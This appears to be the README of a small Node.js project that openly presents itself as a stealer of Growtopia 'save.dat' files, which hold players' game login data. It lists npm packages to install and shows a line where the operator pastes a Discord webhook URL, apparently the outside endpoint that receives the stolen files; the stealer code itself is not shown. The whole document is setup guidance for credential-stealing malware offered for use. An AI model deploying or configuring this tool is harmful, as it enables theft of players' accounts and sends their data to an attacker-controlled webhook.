# Node-Save.dat-stealer
Super simple growtopia save.dat stealer written by node js

Installation
=======

- ```npm install username```
- ```npm install request```
- ```npm install discord-webhook-node```


editing webhook url
===============
```js
const client = new Webhook('your webhook url');//your webhook url
```
